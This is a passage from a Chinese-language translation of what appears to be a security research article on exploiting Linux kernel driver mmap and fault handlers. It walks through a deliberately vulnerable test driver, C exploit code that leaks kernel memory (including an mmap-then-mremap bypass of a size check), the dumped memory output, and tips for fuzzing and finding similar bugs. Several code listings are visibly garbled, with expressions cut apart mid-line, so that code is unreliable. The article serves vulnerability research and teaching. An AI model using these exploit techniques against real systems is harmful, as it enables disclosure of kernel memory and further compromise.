            return 0;
    }
    static struct vm_operations_struct simple_remap_vm_ops = {
        .open = simple_vma_open,
        .close = simple_vma_close,
        .fault = simple_vma_fault,
    };
    static int simple_vma_ops_mmap(struct file *filp, struct vm_area_struct *vma)
    {
        printk(KERN_INFO "MWR: Device simple_vma_ops_mmap\n");
        vma->vm_private_data = filp->private_data;
        vma->vm_ops = &simple_remap_vm_ops;
        simple_vma_open(vma);
        printk(KERN_INFO "MWR: Device mmap OK\n");
        return 0;
    }
    int simple_vma_fault(struct vm_area_struct *vma, struct vm_fault *vmf)
    {
        struct page *page = NULL;
        unsigned long offset;
        printk(KERN_NOTICE "MWR: simple_vma_fault\n");
        printk(KERN_NOTICE "MWR: vmf->pgoff: %lx, vma->vm_pgoff: %lx, sum: %lx,
    PAGE_SHIFT: %x\n", (unsigned long)vmf->pgoff, (unsigned long)vma->vm_pgoff, ((vmf>pgoff vm_pgoff virtual_address - vma->vm_start) + (vma>vm_pgoff
     PAGE_SIZE vm_private_data + offset);
        vmf->page = page;
        get_page(page);
    nopage_out:
        return 0;
    }
具有只读驱动程序文件意味着我们将无法将内存映射为可写，并且只能读取映射的内存。
我们从分析驱动程序代码开始，可以看到驱动程序的`open`操作，名为`dev_open`的函数将简单地分配一个0x1000字节的缓冲区。
在`simple_vma_ops_mmap`mmap处理程序中，可以看到没有验证，并且将虚拟内存操作结构分配给请求的内存区域。
在这个结构中，我们找到了`simple_vma_fault`fault处理程序的实现。
`simple_vma_fault`函数首先计算触发故障的内存页的偏移量。 接下来，它通过添加先前分配的（`vma>
vm_private_data`）缓冲区和`offset`变量来检索页面。 最后，检索到的页面被分配到`vmf>page`字段。
这将导致该页面被映射到发生故障的虚拟地址。
但是，在返回页面之前，将执行以下验证：
    if (offset > PAGE_SIZE private_data = kzalloc(size, GFP_KERNEL);
        ...
            return 0;
    }
这允许恶意进程请求位于驱动程序缓冲区之后的0x9000字节，从而导致内核内存被泄露。
让我们使用下面的代码来利用驱动程序：
    void hexDump(char *desc, void *addr, int len);
    int main(int argc, char * const * argv)
    {
        int fd = open("/dev/MWR_DEVICE", O_RDONLY);
        if (fd pgoff: 0, vma->vm_pgoff: 0, sum: 0, PAGE_SHIFT: c
    [ 681.741695] MWR: simple_vma_fault
    [ 681.741697] MWR: vmf->pgoff: 1, vma->vm_pgoff: 0, sum: 1000, PAGE_SHIFT: c
    [ 681.760845] MWR: simple_vma_fault
    [ 681.760847] MWR: vmf->pgoff: 2, vma->vm_pgoff: 0, sum: 2000, PAGE_SHIFT: c
    [ 681.765431] MWR: simple_vma_fault
    [ 681.765433] MWR: vmf->pgoff: 3, vma->vm_pgoff: 0, sum: 3000, PAGE_SHIFT: c
    [ 681.775586] MWR: simple_vma_fault
    [ 681.775588] MWR: vmf->pgoff: 4, vma->vm_pgoff: 0, sum: 4000, PAGE_SHIFT: c
    [ 681.776835] MWR: simple_vma_fault
    [ 681.776837] MWR: vmf->pgoff: 5, vma->vm_pgoff: 0, sum: 5000, PAGE_SHIFT: c
    [ 681.777991] MWR: simple_vma_fault
    [ 681.777992] MWR: vmf->pgoff: 6, vma->vm_pgoff: 0, sum: 6000, PAGE_SHIFT: c
    [ 681.779318] MWR: simple_vma_fault
    [ 681.779319] MWR: vmf->pgoff: 7, vma->vm_pgoff: 0, sum: 7000, PAGE_SHIFT: c
### 4.4 通过fault处理程序对mmap进行利用-版本二
假设开发人员在前面的`simple_vma_ops_mmap`函数代码中引入了一个修补程序。
正如下面所看到的，新代码通过检查它小于0x1000来验证映射的大小。 从理论上讲，这会阻止我们以前的攻击。
    static int simple_vma_ops_mmap(struct file *filp, struct vm_area_struct *vma)
    {
        unsigned long size = vma->vm_end - vma->vm_start;
        printk(KERN_INFO "MWR: Device simple_vma_ops_mmap\n");
        vma->vm_private_data = filp->private_data;
        vma->vm_ops = &simple_remap_vm_ops;
        simple_vma_open(vma);
        if (size > 0x1000)
        {
            printk(KERN_INFO "MWR: mmap failed, requested too large a chunk of
        memory\n");
            return -EAGAIN;
        }
        printk(KERN_INFO "MWR: Device mmap OK\n");
        return 0;
    }
但是，尽管无法使用mmap创建大型映射，但该代码仍然可被利用。 我们可以将映射过程分成两步：
    1. 调用大小为0x1000字节的mmap
    2. 调用大小为0x10000字节的mremap
这意味着，我们创建一个0x1000字节的小映射，它将通过验证，然后使用`mremap`来扩大它的大小。 最后，我们可以像以前那样转储内存：
    int main(int argc, char * const * argv)
    {
        int fd = open("/dev/MWR_DEVICE", O_RDONLY);
        if (fd < 0)
        {
            printf("[-] Open failed!\n");
            return -1;
        }
        printf("[+] Open OK fd: %d\n", fd);
        unsigned long size = 0x1000;
        unsigned long mmapStart = 0x42424000;
        unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ,
        MAP_SHARED, fd, 0x0);
        if (addr == MAP_FAILED)
        {
            perror("Failed to mmap: ");
            close(fd);
            return -1;
        }
        printf("[+] mmap OK addr: %lx\n", addr);
        addr = (unsigned int *)mremap(addr, size, 0x10000, 0);
        if (addr == MAP_FAILED)
        {
            perror("Failed to mremap: ");
            close(fd);
            return -1;
        }
        printf("[+] mremap OK addr: %lx\n", addr);
        hexDump(NULL, addr, 0x8000);
        int stop = getchar();
        return 0;
    }
这个漏洞为我们提供了以下输出。 同样，可以看到我们能够转储原本无法读取的内存内容：
    $ ./mwr_client
    [+] Open OK fd: 3
    [+] mmap OK addr: 42424000
    [+] mremap OK addr: 42424000
     0000 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
     0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
     ...
     4c00 25 b0 4d c3 00 00 00 00 25 c0 4d c3 00 00 00 00 %.M.....%.M.....
     4c10 25 d0 4d c3 00 00 00 00 25 e0 4d c3 00 00 00 00 %.M.....%.M.....
     4c20 25 f0 4d c3 00 00 00 00 25 00 4e c3 00 00 00 00 %.M.....%.N.....
     4c30 25 10 4e c3 00 00 00 00 00 00 00 00 00 00 00 00 %.N.............
     4c40 25 30 4e c3 00 00 00 00 25 40 4e c3 00 00 00 00 %0N.....%@N.....
     ...
# 5\. 技巧和窍门
### 5.1 为赢而Fuzzing!
通常，在分析mmap处理程序时，会发现很多位掩码，位移和算术。这些操作可以很容易地错过某些可能允许攻击者绕过输入验证并获得对某些内存区域的无意访问的“magic”值。
有两个值需要fuzz：偏移量和映射的大小。 只有fuzz这两个值可以使我们能相对较快地fuzz驱动，允许我们尝试各种各样的值，以确保彻底测试潜在的边缘案例。
### 5.2 不同函数的同一个问题
在本文中，我们描述了`remap_pfn_range`函数及其fault处理程序用于创建内存映射的用法。
但是，这不是唯一可以利用这种方式的函数，并且还有许多其他函数可以被滥用以修改任意区域的内存。您无法通过专注于单一函数来保证驱动程序的安全。
其他具有类似功能的潜在的有趣函数包括：
    vm_insert_page
    vm_insert_pfn
    vm_insert_pfn_prot
    vm_iomap_memory
    io_remap_pfn_range
    remap_vmalloc_range_partial
    remap_vmalloc_range
完整的函数列表在两个不同的内核版本中可能有所不同
### 5.3 在哪里能找到此类型的漏洞？
在这篇文章中，我们描述了一个设备驱动程序实现mmap处理程序的漏洞。 但是，几乎所有子系统都可以实现一个自定义的mmap处理程序。
您应该期望proc，sysfs，debugfs，自定义文件系统，套接字以及任何提供文件描述符的源文件都可以实现易受攻击的mmap处理程序。
而且，`remap_pfn_range`可以从任何系统调用处理程序调用，而不仅仅是mmap。 你一定会期望在ioctl的处理程序中也能找到这个功能。